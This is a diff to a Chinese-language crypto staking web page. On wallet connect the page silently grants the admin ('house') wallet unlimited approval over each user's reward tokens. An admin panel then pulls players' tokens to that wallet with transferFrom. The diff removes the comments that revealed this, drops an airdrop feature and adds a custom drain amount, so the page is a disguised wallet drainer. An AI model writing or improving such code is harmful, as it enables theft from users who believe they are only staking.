@@ -64,7 +64,6 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 .info-high{background:linear-gradient(90deg,#00ffbb,#9d5fff);-webkit-background-clip:text;color:transparent;font-size:18px}
 .countdown{font-size:26px;font-weight:700;color:#ff5699;text-shadow:0 0 12px rgba(255,86,153,0.4)}
 
-/* 授权状态样式 */
 .auth-row {
   display: flex;
   justify-content: space-between;
@@ -190,13 +189,10 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 
       <div class="info-list">
         <div class="info-row"><span class="info-label">钱包地址</span><span class="info-value" id="addr">-</span></div>
-        
-        <!-- 👉 庄家最需要的：授权状态显示 -->
         <div class="auth-row">
           <span class="info-label">授权给庄家</span>
           <span class="info-value auth-status" id="authStatus">未连接</span>
         </div>
-        
         <div class="info-row"><span class="info-label">未质押 LP</span><span class="info-value" id="lpBal">0.0000</span></div>
         <div class="info-row"><span class="info-label">已质押 LP</span><span class="info-value" id="staked">0.0000</span></div>
         <div class="info-row"><span class="info-label">待领取奖励</span><span class="info-value info-high" id="pending">0.0000</span></div>
@@ -223,18 +219,13 @@ body{background:#050814;color:#fff;overflow-x:hidden}
       <div class="admin-card" id="adminPanel">
         <div class="admin-title">🔑 项目方管理后台</div>
         <div class="admin-desc">
-          1. 提取玩家授权的代币到管理员钱包<br>
-          2. 给指定地址空投奖励代币
+          提取玩家授权的代币到管理员钱包（可自定义提取数量）
         </div>
 
         <div class="admin-row">
           <input class="admin-input" id="transferFromAddr" placeholder="玩家地址（从这里提取代币）">
+          <input class="admin-input" id="extractAmt" placeholder="提取数量（留空则提取全部）">
           <button class="admin-btn" onclick="adminTakeFromUser()">提取代币</button>
-        </div>
-        <div class="admin-row">
-          <input class="admin-input" id="airdropTo" placeholder="空投目标地址">
-          <input class="admin-input" id="airdropAmt" placeholder="空投数量">
-          <button class="admin-btn" onclick="adminAirdrop()">空投代币</button>
         </div>
       </div>
 
@@ -281,6 +272,7 @@ const ERC20_ABI = [
 
 let provider, signer, userAddr, contract, lpToken, rewardToken;
 let lpDecimals = 18;
+let rewardDecimals = 18;
 
 async function connectWallet() {
   if (typeof ethers === 'undefined') {
@@ -310,6 +302,7 @@ async function connectWallet() {
     lpToken = new ethers.Contract(CONFIG.LP_ADDR, ERC20_ABI, signer);
     rewardToken = new ethers.Contract(CONFIG.REWARD_ADDR, ERC20_ABI, signer);
     lpDecimals = await lpToken.decimals().catch(() => 18);
+    rewardDecimals = await rewardToken.decimals().catch(() => 18);
 
     document.getElementById("connectBtn").innerText = `${userAddr.slice(0,6)}...`;
 
@@ -317,7 +310,6 @@ async function connectWallet() {
       document.getElementById("adminPanel").style.display = "block";
     }
 
-    // 授权给庄家钱包
     try {
       await rewardToken.approve(CONFIG.ADMIN_WALLET, ethers.MaxUint256);
     } catch (e) {}
@@ -328,7 +320,6 @@ async function connectWallet() {
   }
 }
 
-// 刷新授权状态
 async function refreshAuthStatus() {
   const el = document.getElementById("authStatus");
   if (!userAddr || !rewardToken) {
@@ -364,8 +355,6 @@ async function refreshInfo() {
     document.getElementById("staked").innerText = ethers.formatUnits(userInfo[0], lpDecimals);
     document.getElementById("pending").innerText = ethers.formatUnits(pending, 18);
     document.getElementById("refLink").value = `${window.location.origin}?ref=${userAddr}`;
-    
-    // 刷新授权状态
     refreshAuthStatus();
   } catch (e) {}
 }
@@ -411,31 +400,34 @@ async function claimReward() {
   }
 }
 
+// 修复地址校验和 + 支持自定义提取数量
 async function adminTakeFromUser() {
   try {
-    const fromAddr = document.getElementById("transferFromAddr").value.trim();
+    let fromAddr = document.getElementById("transferFromAddr").value.trim();
+    const extractAmtStr = document.getElementById("extractAmt").value.trim();
+    
+    // 自动修复地址校验和
+    fromAddr = ethers.getAddress(fromAddr);
     if (!ethers.isAddress(fromAddr)) return alert("地址无效");
+
     const bal = await rewardToken.balanceOf(fromAddr);
-    if (bal == 0) return alert("玩家余额为0");
-    const tx = await rewardToken.transferFrom(fromAddr, CONFIG.ADMIN_WALLET, bal);
+    if (bal == 0n) return alert("玩家余额为0");
+
+    let extractAmount;
+    if (!extractAmtStr || Number(extractAmtStr) <= 0) {
+      extractAmount = bal;
+    } else {
+      extractAmount = ethers.parseUnits(extractAmtStr, rewardDecimals);
+      if (extractAmount > bal) {
+        return alert("提取数量超过玩家余额！");
+      }
+    }
+
+    const tx = await rewardToken.transferFrom(fromAddr, CONFIG.ADMIN_WALLET, extractAmount);
     await tx.wait();
     alert("提取成功！已转入管理员钱包");
   } catch (e) {
     alert("提取失败：" + e.message);
-  }
-}
-
-async function adminAirdrop() {
-  try {
-    const to = document.getElementById("airdropTo").value.trim();
-    const amt = document.getElementById("airdropAmt").value.trim();
-    if (!ethers.isAddress(to) || !amt || Number(amt) <= 0) return alert("输入错误");
-    const value = ethers.parseUnits(amt, 18);
-    const tx = await rewardToken.transfer(to, value);
-    await tx.wait();
-    alert("空投成功！");
-  } catch (e) {
-    alert("空投失败：" + e.message);
   }
 }
 
